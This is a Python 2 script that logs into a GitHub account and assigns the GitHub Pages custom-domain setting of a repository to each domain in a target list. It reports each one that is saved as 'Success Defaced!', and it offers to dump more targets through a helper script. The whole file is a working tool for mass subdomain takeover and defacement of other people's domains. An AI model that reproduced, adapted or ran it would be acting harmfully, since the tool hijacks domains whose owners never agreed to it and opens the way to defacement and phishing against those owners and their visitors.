# encoding=utf8
try:
    import requests, sys, mechanize, os
except:
    os.system("pip install requests mechanize")
reload(sys)
sys.setdefaultencoding('utf8')
class deface:
    def __init__(self, br):
        self.br = br
        self.repo = sys.argv[3]
        self.lais = sys.argv[4]
        try:
            self.file = open(self.lais, "r")
        except:
            print ("\033[39m[ \033[31mWARNING \033[39m] \033[39mList not found!")
            while True:
                naona = raw_input("\033[39m[ \033[31mDUMP \033[39m] \033[39mDo You Want to dump list? [Y/n]: ")
                if naona =="Y" or naona =="y":
                    os.system("python2 404Hub.py")
                    break
                else:
                    sys.exit()
        while True:
            self.domain = self.file.readline().strip()
            if self.domain.startswith("http"):
                self.domain = self.domain.split("//")[1]
            self.url_tai = ("https://github.com/" + sys.argv[1] + "/" + self.repo + "/settings")
            try:
                self.br.open(self.url_tai)
            except:
                print ("\033[39m[ \033[31mWARNING \033[39m] \033[39mRepository Not Found!")
                sys.exit()
            def select_form(form):
                return form.attrs.get('action', None) == ('/' + sys.argv[1] + '/' + self.repo + '/settings/pages/cname')
            try:
                self.br.select_form(predicate=select_form)
                self.br["cname"] = self.domain
                self.ganti = self.br.submit().read()
            except:
                print ("\033[39m[ \033[31mWARNING \033[39m] \033[39mChange Your Repository Setting to Master Branch!")
                sys.exit()
            if 'saved' in self.ganti:
                print ("\033[39m[ \033[32mINFO \033[39m] \033[39m" + self.domain + " \033[32mSuccess Defaced!")
                break
            else:
                print ("\033[39m[ \033[32mINFO \033[39m] \033[39m" + self.domain + " \033[31mFailed Deface!")
                continue

class login:
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        try:
            self.username = sys.argv[1]
            self.password = sys.argv[2]
        except:
            print ("\033[39m[ \033[31mWARNING \033[39m] Use: python selgit.py <username> <password> <repositories> <list>")
            sys.exit()
        print ("\033[39m[ \033[32mINFO \033[39m] \033[39mLogged In...")
        self.url_buka = ("https://github.com/login")
        self.br.open(self.url_buka).read()
        self.br.select_form(nr=0)
        self.br["login"] = (self.username)
        self.br["password"] = (self.password)
        self.login = self.br.submit().read()
        if "repositories" in self.login:
            print ("\033[39m[ \033[32mINFO \033[39m] \033[39mLogged In Successfully!")
            deface(self.br)
        else:
            print ("\033[39m[ \033[31mWARNING \033[39m] \033[39mLogged In Failed!")
            sys.exit()

if __name__=='__main__':
    login()
